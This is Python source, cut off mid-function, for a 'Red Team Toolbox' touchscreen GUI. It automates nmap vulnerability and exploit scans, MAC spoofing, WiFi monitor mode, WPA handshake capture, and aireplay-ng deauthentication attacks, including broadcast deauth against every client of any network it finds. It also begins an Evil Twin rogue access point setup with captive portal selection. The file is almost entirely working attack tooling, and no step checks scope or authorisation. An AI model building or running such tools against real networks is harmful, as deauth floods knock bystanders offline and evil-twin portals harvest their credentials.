import tkinter as tk
from tkinter import ttk, simpledialog
import subprocess
import threading
import os
import time
import socket
import re
import tempfile
from datetime import datetime
import glob
import gc  # recolección de basura para liberar memoria

# ==========================================
# CONFIGURACION VISUAL PRO (Red Team Theme)
# ==========================================
COLOR_FONDO_SIDEBAR = "#111111"
COLOR_FONDO_PRINCIPAL = "#1a1a1a"
COLOR_BOTON_ROJO = "#a60000"
COLOR_BOTON_HOVER = "#6b0000"
COLOR_TEXTO_TERMINAL = "#ff4d4d"
COLOR_BOTON_PELIGRO = "#ff9900"

# Directorios base para resultados
BASE_DIR_NMAP = "Resultados_Nmap"
BASE_DIR_WIFI = "Resultados_Handshake"
BASE_DIR_EVIL = "Resultados_EvilTwin"
BASE_DIR_BLE = "Resultados_BLE"

class RedTeamApp(tk.Tk):
    def __init__(self):
        super().__init__()

        self.title("DRAGON FLY - RED TEAM TOOLBOX")
        
        # Configuración para pantalla 320x240
        self.geometry("320x240")
        self.resizable(False, False)
        
        # Estilos ttk oscuros
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('Dark.TFrame', background=COLOR_FONDO_PRINCIPAL)
        style.configure('Dark.TLabel', background=COLOR_FONDO_PRINCIPAL, foreground='white', font=('Helvetica', 10))
        style.configure('Title.TLabel', background=COLOR_FONDO_PRINCIPAL, foreground='#ff4d4d',
                        font=('Helvetica', 12, 'bold'))
        style.configure('Gray.TLabel', background=COLOR_FONDO_PRINCIPAL, foreground='#aaaaaa', font=('Helvetica', 10))
        style.configure('Red.TButton', background=COLOR_BOTON_ROJO, foreground='white', borderwidth=2,
                        relief='raised', font=('Helvetica', 10, 'bold'))
        style.map('Red.TButton', background=[('active', COLOR_BOTON_HOVER)])
        style.configure('Gray.TButton', background='#4a4a4a', foreground='white')
        style.map('Gray.TButton', background=[('active', '#2b2b2b')])
        style.configure('Danger.TButton', background=COLOR_BOTON_PELIGRO, foreground='black')
        style.map('Danger.TButton', background=[('active', '#cc7a00')])
        style.configure('Dark.TCheckbutton', background=COLOR_FONDO_PRINCIPAL, foreground='white')
        style.configure('Dark.TEntry', fieldbackground='#333333', foreground='white')
        style.configure('Dark.TOptionMenu', background=COLOR_BOTON_ROJO, foreground='white')

        # Fullscreen agresivo después de 1 segundo
        def aplicar_kiosco():
            self.attributes('-fullscreen', True)
            self.attributes('-topmost', True)
            self.lift()
            self.focus_force()
        self.after(1000, aplicar_kiosco)
        self.bind("<Escape>", lambda event: self.destroy())

        # Layout principal
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)

        # Variables de estado global
        self.target_ip = tk.StringVar(value="127.0.0.1")
        self.usar_rango = tk.BooleanVar(value=False)
        self.rango_cidr = tk.StringVar(value="/24")
        self.interfaz_seleccionada = tk.StringVar(value="")
        self.session_dir_nmap = ""

        # Estado para flujos complejos (WiFi, BLE)
        self.wifi_state = {}
        self.ble_state = {}
        self.navigation_stack = []

        # Referencias a procesos para Evil Twin
        self.evil_twin_procs = {
            'hostapd': None,
            'dnsmasq': None,
            'capture': None,
            'deauth': None
        }
        self.evil_twin_stop = False

        # Consola buffer
        self.console_buffer = []
        self.console_pending = False
        self._console_after_id = None

        # Gadget BLE – carga perezosa
        self.gadget = None
        self.gadget_available = False
        self._gadget_initialized = False

        # Directorios
        for d in [BASE_DIR_NMAP, BASE_DIR_WIFI, BASE_DIR_EVIL, BASE_DIR_BLE]:
            os.makedirs(d, exist_ok=True)

        # Frame principal (sin scroll, tamaño fijo)
        self.main_frame = ttk.Frame(self, style='Dark.TFrame')
        self.main_frame.pack(fill='both', expand=True)

        self.back_btn = None
        self.show_inicio_menu()

    # ---------------- helpers de navegación ----------------
    def limpiar_main_frame(self):
        # Cancelar envío pendiente de consola
        if self._console_after_id is not None:
            self.after_cancel(self._console_after_id)
            self._console_after_id = None
        self.console_pending = False
        self.console_buffer.clear()
        for widget in self.main_frame.winfo_children():
            widget.destroy()
        self.back_btn = None

    def agregar_boton_atras(self, callback):
        self.back_btn = ttk.Button(self.main_frame, text="← Atrás", style='Gray.TButton',
                                   width=8, command=callback)
        self.back_btn.pack(anchor="nw", padx=2, pady=2)

    def mostrar_consola(self):
        """Crea una consola de solo lectura de 4 líneas"""
        self.console_textbox = tk.Text(self.main_frame, height=4, bg='#0a0a0a',
                                       fg=COLOR_TEXTO_TERMINAL, font=('Courier', 9),
                                       state='disabled')
        self.console_textbox.pack(fill='both', expand=True, padx=2, pady=2)

    def escribir_consola(self, texto):
        """Bufferiza salida y actualiza cada 500 ms"""
        self.console_buffer.append(texto)
        if not self.console_pending:
            self.console_pending = True
            self._console_after_id = self.after(500, self._flush_console)

    def _flush_console(self):
        self.console_pending = False
        self._console_after_id = None
        if not hasattr(self, 'console_textbox') or not self.console_textbox.winfo_exists():
            return
        lines = "\n".join(self.console_buffer) + "\n"
        self.console_buffer.clear()
        try:
            self.console_textbox.configure(state='normal')
            self.console_textbox.insert('end', lines)
            self.console_textbox.see('end')
            self.console_textbox.configure(state='disabled')
        except Exception:
            pass

    def obtener_interfaces_red(self):
        try:
            return sorted([i for i in os.listdir('/sys/class/net/') if i != "lo"])
        except Exception:
            return ["wlan0", "eth0"]

    # ---------------- Validación IP ----------------
    def validar_ip_cidr(self):
        ip = self.target_ip.get().strip()
        if self.usar_rango.get():
            cidr = self.rango_cidr.get().strip()
            patron_ip = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
            patron_cidr = r'^/(8|16|24|32)$'
            if not re.match(patron_ip, ip) or not re.match(patron_cidr, cidr):
                self.escribir_consola("[!] IP/CIDR inválido.")
                return False
        else:
            patron_ip = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
            if not re.match(patron_ip, ip):
                self.escribir_consola("[!] IP inválida.")
                return False
        return True

    def obtener_target(self):
        if not self.validar_ip_cidr():
            return None
        if self.usar_rango.get():
            return f"{self.target_ip.get()}{self.rango_cidr.get()}"
        return self.target_ip.get()

    # ---------------- Ejecución segura de comandos ----------------
    def ejecutar_comando(self, comando, callback_after=None, use_shell=True):
        if use_shell and isinstance(comando, str):
            self.escribir_consola(f"\nroot@kali:~# {comando}")
        else:
            self.escribir_consola(f"\nroot@kali:~# {' '.join(comando)}")

        def run():
            try:
                if use_shell:
                    proc = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE,
                                            stderr=subprocess.STDOUT, text=True)
                else:
                    proc = subprocess.Popen(comando, stdout=subprocess.PIPE,
                                            stderr=subprocess.STDOUT, text=True)
                for line in proc.stdout:
                    self.escribir_consola(line.rstrip())
                proc.wait()
                self.escribir_consola("\n[+] Tarea finalizada.")
                if callback_after:
                    self.after(0, callback_after)
            except Exception as e:
                self.escribir_consola(f"\n[!] ERROR: {e}")
        threading.Thread(target=run, daemon=True).start()

    # ---------------- INICIO DRAGON FLY ----------------
    def show_inicio_menu(self):
        self.limpiar_main_frame()
        ttk.Label(self.main_frame, text="DRAGON FLY SYSTEM", style='Title.TLabel').pack(pady=(8,2))
        ttk.Label(self.main_frame, text="Red Team Toolbox", style='Gray.TLabel').pack(pady=(0,6))

        opciones = [
            ("1. Reconocimiento", self.show_recon_menu),
            ("2. MAC Changer", self.show_mac_menu),
            ("3. Auditoría WiFi", self.show_wifi_menu),
            ("4. Bluetooth BLE", self.show_bluetooth_menu),
            ("5. Rubber Ducky", self.show_ducky_menu),
            ("6. Utilidades OS", self.show_utils_menu)
        ]
        for texto, comando in opciones:
            ttk.Button(self.main_frame, text=texto, style='Red.TButton',
                       command=comando, width=30).pack(fill='x', padx=8, pady=2)

    # ==========================================
    # MENÚ RECONOCIMIENTO (NMAP)
    # ==========================================
    def show_recon_menu(self):
        self.session_dir_nmap = ""
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_inicio_menu)
        ttk.Label(self.main_frame, text="RECONOCIMIENTO (NMAP)", style='Title.TLabel').pack(pady=(2,1))

        config_frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        config_frame.pack(fill='x', padx=2, pady=1)
        ttk.Label(config_frame, text="IP:", style='Dark.TLabel').grid(row=0, column=0, padx=1, pady=1)
        entry_target = ttk.Entry(config_frame, textvariable=self.target_ip, width=16, style='Dark.TEntry')
        entry_target.grid(row=0, column=1, padx=1, pady=1)
        ttk.Button(config_frame, text="Set", style='Red.TButton', width=6,
                   command=lambda: self.escribir_consola(f"[+] Target: {self.obtener_target() or 'Inválido'}")).grid(row=0, column=2, padx=1, pady=1)

        chk_rango = ttk.Checkbutton(config_frame, text="Usar rango", variable=self.usar_rango, style='Dark.TCheckbutton')
        chk_rango.grid(row=1, column=0, columnspan=2, sticky="w", padx=1, pady=1)
        rango_menu = ttk.OptionMenu(config_frame, self.rango_cidr, self.rango_cidr.get(), "/24", "/16", "/8", style='Dark.TOptionMenu')
        rango_menu.grid(row=1, column=2, padx=1, pady=1)

        btn_frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        btn_frame.pack(fill='x', padx=5, pady=2)

        comandos_nmap = [
            ("0. Descubrimiento", "-sn {TARGET} -oN {SESSION}/00_hosts.txt"),
            ("1. Puertos comunes", "-sS -T3 --top-ports 1000 {TARGET} -oN {SESSION}/01_common.txt"),
            ("2. Full TCP", "-sS -p- -T3 {TARGET} -oN {SESSION}/02_full_tcp.txt"),
            ("3. Versiones", "-sV --version-intensity 5 {TARGET} -oN {SESSION}/03_services.txt"),
            ("4. OS Guessing", "-O --osscan-guess {TARGET} -oN {SESSION}/04_os.txt"),
            ("5. Vulnerabilidades", "--script vuln,exploit {TARGET} -oN {SESSION}/06_vuln.txt"),
            ("6. Automatizado", f"-sn {{TARGET}} -oN {{SESSION}}/12a_discovery.txt && nmap -sS -p- -T3 {{TARGET}} -oN {{SESSION}}/12b_ports.txt")
        ]

        for nombre, cmd in comandos_nmap:
            ttk.Button(btn_frame, text=nombre, style='Red.TButton',
                       command=lambda c=cmd: self._ejecutar_nmap(c), width=28).pack(fill='x', pady=1)

        ttk.Button(self.main_frame, text="Ver Resultados", style='Gray.TButton',
                   command=self._mostrar_explorador_nmap).pack(pady=3, fill='x', padx=20)
        self.mostrar_consola()

    def _ejecutar_nmap(self, cmd_template):
        target = self.obtener_target()
        if target is None:
            self.escribir_consola("[!] Target inválido.")
            return
        if not self.session_dir_nmap:
            timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
            self.session_dir_nmap = os.path.join(BASE_DIR_NMAP, f"Auditoria-{timestamp}")
        os.makedirs(self.session_dir_nmap, exist_ok=True)
        comando = cmd_template.replace("{TARGET}", target).replace("{SESSION}", self.session_dir_nmap)
        self.ejecutar_comando(f"nmap {comando}")

    def _mostrar_explorador_nmap(self, page=0):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_recon_menu)
        ttk.Label(self.main_frame, text="RESULTADOS NMAP", style='Title.TLabel').pack(pady=2)
        if not os.path.exists(BASE_DIR_NMAP):
            os.makedirs(BASE_DIR_NMAP)
        carpetas = sorted([d for d in os.listdir(BASE_DIR_NMAP) if os.path.isdir(os.path.join(BASE_DIR_NMAP, d))], reverse=True)
        if not carpetas:
            ttk.Label(self.main_frame, text="No hay registros.", style='Dark.TLabel').pack(pady=10)
            return
        items_per_page = 4
        total_pages = (len(carpetas) + items_per_page - 1) // items_per_page
        page = max(0, min(page, total_pages-1))
        start = page * items_per_page
        end = min(start+items_per_page, len(carpetas))
        page_carpetas = carpetas[start:end]
        self._nmap_folders = carpetas
        self._nmap_page = page

        frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        frame.pack(fill='both', expand=True, padx=5, pady=2)
        for carpeta in page_carpetas:
            ruta = os.path.join(BASE_DIR_NMAP, carpeta)
            ttk.Button(frame, text=carpeta, style='Gray.TButton',
                       command=lambda r=ruta: self._mostrar_archivos_nmap(r)).pack(fill='x', pady=2)

        nav_frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        nav_frame.pack(pady=2)
        if page > 0:
            ttk.Button(nav_frame, text="← Anterior", style='Gray.TButton',
                       command=lambda: self._mostrar_explorador_nmap(page-1)).pack(side='left', padx=2)
        if page < total_pages - 1:
            ttk.Button(nav_frame, text="Siguiente →", style='Gray.TButton',
                       command=lambda: self._mostrar_explorador_nmap(page+1)).pack(side='left', padx=2)
        self.mostrar_consola()

    def _mostrar_archivos_nmap(self, ruta, page=0):
        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._mostrar_explorador_nmap(self._nmap_page))
        nombre = os.path.basename(ruta)
        ttk.Label(self.main_frame, text=nombre, style='Title.TLabel').pack(pady=2)
        archivos = sorted([f for f in os.listdir(ruta) if os.path.isfile(os.path.join(ruta, f))])
        if not archivos:
            ttk.Label(self.main_frame, text="Carpeta vacía", style='Dark.TLabel').pack(pady=10)
            return
        items_per_page = 4
        total_pages = (len(archivos) + items_per_page - 1) // items_per_page
        page = max(0, min(page, total_pages-1))
        start = page * items_per_page
        end = min(start+items_per_page, len(archivos))
        page_files = archivos[start:end]
        self._nmap_files = archivos
        self._nmap_files_page = page
        self._nmap_files_ruta = ruta

        frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        frame.pack(fill='both', expand=True, padx=5, pady=2)
        for archivo in page_files:
            ruta_arch = os.path.join(ruta, archivo)
            ttk.Button(frame, text=archivo, style='Gray.TButton',
                       command=lambda ra=ruta_arch: self.ejecutar_comando(f"cat '{ra}'")).pack(fill='x', pady=2)

        nav_frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        nav_frame.pack(pady=2)
        if page > 0:
            ttk.Button(nav_frame, text="← Anterior", style='Gray.TButton',
                       command=lambda: self._mostrar_archivos_nmap(ruta, page-1)).pack(side='left', padx=2)
        if page < total_pages - 1:
            ttk.Button(nav_frame, text="Siguiente →", style='Gray.TButton',
                       command=lambda: self._mostrar_archivos_nmap(ruta, page+1)).pack(side='left', padx=2)
        self.mostrar_consola()
        gc.collect()

    # ==========================================
    # MENÚ MAC CHANGER
    # ==========================================
    def show_mac_menu(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_inicio_menu)
        ttk.Label(self.main_frame, text="DIRECCION MAC", style='Title.TLabel').pack(pady=2)
        interfaces = self.obtener_interfaces_red()
        if not interfaces:
            ttk.Label(self.main_frame, text="No hay interfaces.", style='Dark.TLabel').pack()
            return
        self.interfaz_seleccionada.set(interfaces[0])
        sel_frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        sel_frame.pack(pady=3)
        ttk.Label(sel_frame, text="Iface: ", style='Dark.TLabel').pack(side='left')
        ttk.OptionMenu(sel_frame, self.interfaz_seleccionada, self.interfaz_seleccionada.get(),
                       *interfaces, style='Dark.TOptionMenu').pack(side='left')

        botones = [
            ("Ver Estado", f"sudo macchanger -s {self.interfaz_seleccionada.get()}"),
            ("MAC Random", f"sudo ifconfig {self.interfaz_seleccionada.get()} down && sudo macchanger -r {self.interfaz_seleccionada.get()} && sudo ifconfig {self.interfaz_seleccionada.get()} up"),
            ("Reset Original", f"sudo ifconfig {self.interfaz_seleccionada.get()} down && sudo macchanger -p {self.interfaz_seleccionada.get()} && sudo ifconfig {self.interfaz_seleccionada.get()} up"),
            ("Mismo Fabricante", f"sudo ifconfig {self.interfaz_seleccionada.get()} down && sudo macchanger -a {self.interfaz_seleccionada.get()} && sudo ifconfig {self.interfaz_seleccionada.get()} up")
        ]
        for texto, cmd in botones:
            ttk.Button(self.main_frame, text=texto, style='Red.TButton',
                       command=lambda c=cmd: self.ejecutar_comando(c)).pack(fill='x', padx=10, pady=2)
        self.mostrar_consola()

    # ==========================================
    # MENÚ AUDITORÍA WIFI
    # ==========================================
    def show_wifi_menu(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_inicio_menu)
        ttk.Label(self.main_frame, text="AUDITORÍA WIFI", style='Title.TLabel').pack(pady=2)
        opciones = [
            ("Activar Monitor", self._wifi_modo_monitor),
            ("Captura Handshake", self._wifi_captura_handshake),
            ("Ataque Evil Twin", self._wifi_evil_twin),
            ("Desautenticación", self._wifi_deauth),
            ("Explorar Handshakes", self._wifi_explorar_handshakes),
            ("Explorar Evil Twin", self._wifi_explorar_evil),
        ]
        for texto, cmd in opciones:
            ttk.Button(self.main_frame, text=texto, style='Red.TButton',
                       command=cmd, width=26).pack(fill='x', padx=10, pady=2)
        self.mostrar_consola()

    def _wifi_modo_monitor(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_wifi_menu)
        ttk.Label(self.main_frame, text="MODO MONITOR", style='Title.TLabel').pack(pady=2)
        interfaces = self.obtener_interfaces_red()
        if not interfaces:
            ttk.Label(self.main_frame, text="No hay interfaces.", style='Dark.TLabel').pack()
            return
        for iface in interfaces:
            def comando_iface(i=iface):
                subprocess.run(["sudo", "airmon-ng", "check", "kill"],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(["sudo", "airmon-ng", "start", i],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.ejecutar_comando(f"sudo airmon-ng start {i}",
                                     callback_after=lambda: self.escribir_consola("[+] Hecho."))
            ttk.Button(self.main_frame, text=f"Start {iface}", style='Red.TButton',
                       command=comando_iface).pack(fill='x', padx=10, pady=2)
        self.mostrar_consola()

    def _generar_nombre_temporal(self, prefijo):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        return f"/tmp/{prefijo}_{timestamp}"

    def _wifi_captura_handshake(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_wifi_menu)
        ttk.Label(self.main_frame, text="CAPTURAR: Elija IFace", style='Title.TLabel').pack(pady=2)
        interfaces = self.obtener_interfaces_red()
        for iface in interfaces:
            ttk.Button(self.main_frame, text=iface, style='Red.TButton',
                       command=lambda i=iface: self._wifi_escanear_redes_handshake(i)).pack(fill='x', padx=10, pady=2)
        self.mostrar_consola()

    def _wifi_escanear_redes_handshake(self, iface):
        self.wifi_state = {"iface": iface, "mon_iface": None}
        self.escribir_consola(f"[*] Modo monitor en {iface}...")
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "airmon-ng", "start", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        mon = f"{iface}mon" if os.path.exists(f"/sys/class/net/{iface}mon") else iface
        self.wifi_state["mon_iface"] = mon
        scan_prefix = self._generar_nombre_temporal("wifi_handshake")
        self.wifi_state["scan_file"] = scan_prefix

        def escanear():
            # timeout con shell es aceptable aquí
            subprocess.run(f"sudo timeout 15s airodump-ng {mon} -w {scan_prefix} --output-format csv",
                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            redes = []
            try:
                with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
                    partes = f.read().split("Station MAC,")
                    for linea in partes[0].split("\n")[2:]:
                        r = linea.split(",")
                        if len(r) >= 14 and ":" in r[0]:
                            redes.append({"bssid": r[0].strip(), "ch": r[3].strip(),
                                          "essid": r[13].strip() if r[13].strip() else "<Oculta>"})
            except: pass
            finally:
                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                    try: os.remove(f"{scan_prefix}{ext}")
                    except: pass
            self.after(0, lambda: self._wifi_mostrar_redes_handshake(redes))
        threading.Thread(target=escanear, daemon=True).start()
        self.escribir_consola("[*] Escaneando 15s...")

    def _wifi_mostrar_redes_handshake(self, redes, page=0):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._wifi_captura_handshake)
        ttk.Label(self.main_frame, text="SELECCIONA RED", style='Title.TLabel').pack(pady=2)
        if not redes:
            ttk.Label(self.main_frame, text="No hay redes.", style='Dark.TLabel').pack()
            return
        items_per_page = 4
        total_pages = (len(redes) + items_per_page - 1) // items_per_page
        page = max(0, min(page, total_pages-1))
        start = page * items_per_page
        end = min(start+items_per_page, len(redes))
        page_redes = redes[start:end]
        self._redes_handshake = redes
        self._redes_page = page

        frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        frame.pack(fill='both', expand=True, padx=5, pady=2)
        for red in page_redes:
            texto = f"{red['essid']} (CH:{red['ch']})"
            ttk.Button(frame, text=texto, style='Gray.TButton',
                       command=lambda r=red: self._wifi_seleccionar_cliente_handshake(r)).pack(fill='x', pady=1)

        nav_frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        nav_frame.pack(pady=2)
        if page > 0:
            ttk.Button(nav_frame, text="← Anterior", style='Gray.TButton',
                       command=lambda: self._wifi_mostrar_redes_handshake(self._redes_handshake, page-1)).pack(side='left', padx=2)
        if page < total_pages - 1:
            ttk.Button(nav_frame, text="Siguiente →", style='Gray.TButton',
                       command=lambda: self._wifi_mostrar_redes_handshake(self._redes_handshake, page+1)).pack(side='left', padx=2)
        self.mostrar_consola()
        gc.collect()

    def _wifi_seleccionar_cliente_handshake(self, red):
        self.wifi_state["target"] = red
        mon = self.wifi_state["mon_iface"]
        scan_prefix = self._generar_nombre_temporal("wifi_clients")
        subprocess.run(f"sudo timeout 10s airodump-ng --bssid {red['bssid']} -c {red['ch']} {mon} -w {scan_prefix} --output-format csv",
                       shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        clientes = []
        try:
            with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
                partes = f.read().split("Station MAC,")
                if len(partes) > 1:
                    for linea in partes[1].split("\n")[1:]:
                        c = linea.split(",")
                        if len(c) >= 6 and ":" in c[0]:
                            clientes.append(c[0].strip())
        except: pass
        finally:
            for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                try: os.remove(f"{scan_prefix}{ext}")
                except: pass

        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._wifi_mostrar_redes_handshake([red]))
        ttk.Label(self.main_frame, text="CLIENTES", style='Title.TLabel').pack(pady=2)
        frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        frame.pack(fill='both', expand=True, padx=5, pady=2)
        ttk.Button(frame, text="Todos (Broadcast)", style='Danger.TButton',
                   command=lambda: self._wifi_iniciar_ataque_handshake("FF:FF:FF:FF:FF:FF")).pack(fill='x', pady=2)
        items_per_page = 4
        total_pages = (len(clientes) + items_per_page - 1) // items_per_page
        page = 0
        start = page * items_per_page
        end = min(start+items_per_page, len(clientes))
        page_clientes = clientes[start:end]
        self._clientes_handshake = clientes
        self._clientes_page = page

        for mac in page_clientes:
            ttk.Button(frame, text=mac, style='Gray.TButton',
                       command=lambda m=mac: self._wifi_iniciar_ataque_handshake(m)).pack(fill='x', pady=1)

        if total_pages > 1:
            nav_frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
            nav_frame.pack(pady=2)
            def paginar(p):
                self.limpiar_main_frame()
                self.agregar_boton_atras(lambda: self._wifi_mostrar_redes_handshake([red]))
                ttk.Label(self.main_frame, text="CLIENTES", style='Title.TLabel').pack(pady=2)
                frm = ttk.Frame(self.main_frame, style='Dark.TFrame')
                frm.pack(fill='both', expand=True, padx=5, pady=2)
                ttk.Button(frm, text="Todos (Broadcast)", style='Danger.TButton',
                           command=lambda: self._wifi_iniciar_ataque_handshake("FF:FF:FF:FF:FF:FF")).pack(fill='x', pady=2)
                s = p*items_per_page
                e = min(s+items_per_page, len(clientes))
                for m in clientes[s:e]:
                    ttk.Button(frm, text=m, style='Gray.TButton',
                               command=lambda x=m: self._wifi_iniciar_ataque_handshake(x)).pack(fill='x', pady=1)
                nf = ttk.Frame(self.main_frame, style='Dark.TFrame')
                nf.pack(pady=2)
                if p > 0:
                    ttk.Button(nf, text="← Anterior", style='Gray.TButton',
                               command=lambda: paginar(p-1)).pack(side='left', padx=2)
                if p < total_pages-1:
                    ttk.Button(nf, text="Siguiente →", style='Gray.TButton',
                               command=lambda: paginar(p+1)).pack(side='left', padx=2)
                self.mostrar_consola()
            if page > 0:
                ttk.Button(nav_frame, text="← Anterior", style='Gray.TButton',
                           command=lambda: paginar(page-1)).pack(side='left', padx=2)
            if page < total_pages-1:
                ttk.Button(nav_frame, text="Siguiente →", style='Gray.TButton',
                           command=lambda: paginar(page+1)).pack(side='left', padx=2)
        self.mostrar_consola()
        gc.collect()

    def _wifi_iniciar_ataque_handshake(self, cliente_mac):
        red = self.wifi_state["target"]
        mon = self.wifi_state["mon_iface"]
        timestamp = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
        session_dir = os.path.join(BASE_DIR_WIFI, f"Auditoria-{timestamp}")
        os.makedirs(session_dir, exist_ok=True)

        # airodump-ng en segundo plano
        subprocess.Popen(["sudo", "airodump-ng", "--channel", red['ch'], "--bssid", red['bssid'],
                         "-w", f"{session_dir}/Captura", mon], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        cmd_deauth = f"sudo aireplay-ng -0 10 -a {red['bssid']} -c {cliente_mac} {mon}"
        self.ejecutar_comando(cmd_deauth, callback_after=lambda: self.escribir_consola(f"[+] Salvado: {session_dir}"))
        self.escribir_consola("[*] Esperando handshake...")

    # ==========================================
    # EVIL TWIN
    # ==========================================
    def _wifi_evil_twin(self):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self.show_wifi_menu)
        ttk.Label(self.main_frame, text="EVIL TWIN - IFace AP", style='Title.TLabel').pack(pady=2)
        interfaces = self.obtener_interfaces_red()
        if len(interfaces) < 2:
            ttk.Label(self.main_frame, text="Requiere 2 interfaces.", style='Dark.TLabel').pack()
            return
        for iface in interfaces:
            ttk.Button(self.main_frame, text=f"AP: {iface}", style='Red.TButton',
                       command=lambda i=iface: self._evil_twin_select_deauth(i)).pack(fill='x', padx=10, pady=2)
        self.mostrar_consola()

    def _evil_twin_select_deauth(self, ap_iface):
        self.wifi_state["ap_iface"] = ap_iface
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._wifi_evil_twin)
        ttk.Label(self.main_frame, text="IFace Deauth", style='Title.TLabel').pack(pady=2)
        for iface in [i for i in self.obtener_interfaces_red() if i != ap_iface]:
            ttk.Button(self.main_frame, text=iface, style='Red.TButton',
                       command=lambda i=iface: self._evil_twin_escanear_redes(i)).pack(fill='x', padx=10, pady=2)
        self.mostrar_consola()

    def _evil_twin_escanear_redes(self, deauth_iface):
        self.wifi_state["deauth_iface"] = deauth_iface
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "airmon-ng", "start", deauth_iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        mon = f"{deauth_iface}mon" if os.path.exists(f"/sys/class/net/{deauth_iface}mon") else deauth_iface
        self.wifi_state["mon_deauth"] = mon

        scan_prefix = self._generar_nombre_temporal("evil_scan")
        self.wifi_state["scan_file"] = scan_prefix

        def escanear():
            subprocess.run(f"sudo timeout 15s airodump-ng {mon} -w {scan_prefix} --output-format csv",
                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            redes = []
            try:
                with open(f"{scan_prefix}-01.csv", "r", errors="ignore") as f:
                    partes = f.read().split("Station MAC,")
                    for linea in partes[0].split("\n")[2:]:
                        r = linea.split(",")
                        if len(r) >= 14 and ":" in r[0]:
                            redes.append({"bssid": r[0].strip(), "ch": r[3].strip(), "essid": r[13].strip() or "<Oculta>"})
            except: pass
            finally:
                for ext in ['-01.csv', '-01.cap', '-01.kismet.csv', '-01.kismet.netxml']:
                    try: os.remove(f"{scan_prefix}{ext}")
                    except: pass
            self.after(0, lambda: self._evil_twin_mostrar_redes(redes))
        threading.Thread(target=escanear, daemon=True).start()
        self.escribir_consola("[*] Escaneando redes...")

    def _evil_twin_mostrar_redes(self, redes, page=0):
        self.limpiar_main_frame()
        self.agregar_boton_atras(self._wifi_evil_twin)
        ttk.Label(self.main_frame, text="RED OBJETIVO", style='Title.TLabel').pack(pady=2)
        if not redes:
            ttk.Label(self.main_frame, text="No hay redes.", style='Dark.TLabel').pack()
            return
        items_per_page = 4
        total_pages = (len(redes) + items_per_page - 1) // items_per_page
        page = max(0, min(page, total_pages-1))
        start = page * items_per_page
        end = min(start+items_per_page, len(redes))
        page_redes = redes[start:end]
        self._evil_redes = redes
        self._evil_page = page

        frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        frame.pack(fill='both', expand=True, padx=5, pady=2)
        for red in page_redes:
            texto = f"{red['essid']} (CH:{red['ch']})"
            ttk.Button(frame, text=texto, style='Gray.TButton',
                       command=lambda r=red: self._evil_twin_seleccionar_portal(r)).pack(fill='x', pady=1)

        nav_frame = ttk.Frame(self.main_frame, style='Dark.TFrame')
        nav_frame.pack(pady=2)
        if page > 0:
            ttk.Button(nav_frame, text="← Anterior", style='Gray.TButton',
                       command=lambda: self._evil_twin_mostrar_redes(self._evil_redes, page-1)).pack(side='left', padx=2)
        if page < total_pages - 1:
            ttk.Button(nav_frame, text="Siguiente →", style='Gray.TButton',
                       command=lambda: self._evil_twin_mostrar_redes(self._evil_redes, page+1)).pack(side='left', padx=2)
        self.mostrar_consola()
        gc.collect()

    def _evil_twin_seleccionar_portal(self, red):
        self.wifi_state["target"] = red
        self.limpiar_main_frame()
        self.agregar_boton_atras(lambda: self._evil_twin_mostrar_redes([red]))
        ttk.Label(self.main_frame, text="PORTAL CAUTIVO", style='Title.TLabel').pack(pady=2)
        portals_dir = os.path.join(os.path.dirname(__file__), "evil_portals")
        os.makedirs(portals_dir, exist_ok=True)
        portales = [d for d in os.listdir(portals_dir) if os.path.isdir(os.path.join(portals_dir, d))]
        if not portales:
